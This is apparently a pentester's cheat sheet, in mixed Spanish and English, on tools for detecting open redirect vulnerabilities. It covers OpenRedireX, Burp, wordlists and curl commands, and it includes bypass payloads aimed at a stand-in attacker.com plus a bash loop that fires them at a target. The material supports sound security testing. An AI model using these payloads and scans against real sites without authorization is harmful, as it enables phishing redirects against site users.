---
aliases:
  - OpenRedireX
  - Open Redirect Scanner
  - ffuf Redirect
tags:
  - type/cheatsheet
  - vuln/open-redirect
  - technique/discovery
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Open Redirect]]'
  - '[[Burp Suite]]'
  - '[[ffuf]]'
---
# Open Redirect - Tooling

***

## OpenRedireX

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Repo | `git clone https://github.com/devanshbatham/OpenRedireX` | Python — fuzzer dedicado. |
| Single URL | `python openredirex.py -u "https://target/login?next=" -p payloads.txt` | Test param. |
| Multiple URLs | `python openredirex.py -l urls.txt -p payloads.txt` | Bulk. |
| Built-in payloads | `payloads/redirect_payloads.txt` (300+ payloads) | Default list. |
| Keyword replace | `FUZZ` keyword en URL → tool inserta payloads | Marker-based. |
| Default keyword | If no `FUZZ`, tool prueba auto-detect param | Auto. |
| Threads | `-c 50` concurrencia | Speed. |
| Output verbose | `-v` flag | Debug. |
| Combine con Burp | Proxy through Burp para inspect | `--proxy http://127.0.0.1:8080`. |
| Output JSON | Custom flag | Reportable. |
| Headers custom | Auth header etc | Authenticated. |
| Pipe input | `cat urls.txt | python openredirex.py -p payloads.txt` | Pipe-friendly. |
^or-tool-openredirex

___

## Burp Active Scanner + Param Miner

| **Función** | **Acción** | **Notas** |
|:---:|:---:|:---:|
| Burp Pro Active Scan | Right-click request → "Do active scan" | Built-in. |
| Burp BCheck rules | OR-specific BChecks (Burp Pro 2024+) | Modern detection. |
| Param Miner unkeyed inputs | Detect headers que afectan redirect | `X-Forwarded-Host` etc. |
| Reflection panel | Identifica reflejos de input en response | Pre-detection. |
| Repeater + manual fuzz | Test payloads manualmente | Fine-grained. |
| Intruder con payload set | Carga `redirect_payloads.txt` | Bulk fuzz. |
| Hackvertor | Encoding payloads dynamically | Bypass evasion. |
| ZAP scanner | OWASP ZAP free alternative | OR detection rule. |
| Logger++ | Filter responses por status 30x | Visual. |
| Comparer | Diff entre redirects | Validate behavior. |
^or-tool-burp

___

## Wordlists (PayloadsAllTheThings + extras)

| **Wordlist** | **Path** | **Uso** |
|:---:|:---:|:---:|
| PayloadsAllTheThings - Open Redirect | `PayloadsAllTheThings/Open Redirect/` | Classic + bypasses. |
| OpenRedireX default | `OpenRedireX/payloads/redirect_payloads.txt` | 300+ entries. |
| SecLists - URL Redirect | `SecLists/Fuzzing/URLs-and-paths-fuzz.txt` | Path fuzzing. |
| Custom polyglot | One payload, multiple bypasses combined | Single-shot. |
| `https://attacker.com` baseline | Simple test | Quick check. |
| `//attacker.com` baseline | Protocol-relative | Common bypass. |
| `\\\\attacker.com` baseline | Backslash | Browser quirks. |
| `https://target.com.attacker.com` | Suffix bypass | Whitelist defeat. |
| `https://target.com@attacker.com` | Userinfo trick | Parser confusion. |
| `javascript:alert(1)` | XSS combo | Scheme. |
| `data:text/html,<script>...` | data URL | Same. |
| `https%3A%2F%2Fattacker.com` | URL-encoded | Encoding. |
| `xn--ttacker-...` | Punycode | IDN spoofing. |
| Burp Intruder builtin | "Open redirect (extended)" payload set | Pro feature. |
^or-tool-wordlists

___

## Manual curl / Custom Scripts

| **Function** | **Command** | **Notas** |
|:---:|:---:|:---:|
| Test single payload | `curl -sI "https://target/login?next=https://attacker.com" | grep -i location` | Quick check. |
| Loop over payloads | `for p in $(cat payloads.txt); do curl -sI "https://target/login?next=$p" | grep -i location; done` | Bulk. |
| Extract Location header | `curl -sI ... | awk -F': ' '/^[Ll]ocation:/{print $2}'` | Parse. |
| Detect meta refresh | `curl -s ... | grep -oE '<meta[^>]*refresh[^>]*>'` | HTML-based. |
| Detect JS redirect | `curl -s ... | grep -oE 'location\s*[=.][^;]*'` | Client-side. |
| Validate redirect target | `final=$(curl -sLo /dev/null -w '%{url_effective}' ...)` | Follow + final URL. |
| Headers + body análisis | `curl -i ... | tee response.txt` | Save full. |
| Custom Python script | `requests.get(url, allow_redirects=False).headers['Location']` | Programmable. |
| Async batch test | `aiohttp` async scan | Speed. |
| nuclei templates | `nuclei -t open-redirect.yaml -u target` | Curated rule. |
| `gau` + filter URLs | Get archived URLs + filter for redirect params | Wayback. |
| `gf` patterns | `gf redirect` filter URLs from history | Single-grep. |
^or-tool-manual

### Bash one-liner test

```bash
PAYLOADS=(
  'https://attacker.com'
  '//attacker.com'
  '\\\\attacker.com'
  'https://target.com@attacker.com'
  'https://target.com.attacker.com'
  'javascript:alert(1)'
  'https%3A%2F%2Fattacker.com'
  '%2F%2Fattacker.com'
)

for p in "${PAYLOADS[@]}"; do
  ENCODED=$(printf '%s' "$p" | jq -sRr @uri)
  RESULT=$(curl -sI "https://target.com/login?next=$ENCODED" | grep -i 'location:' | head -1)
  if echo "$RESULT" | grep -qE 'attacker|alert'; then
    echo "[!] $p → $RESULT"
  fi
done
```

***
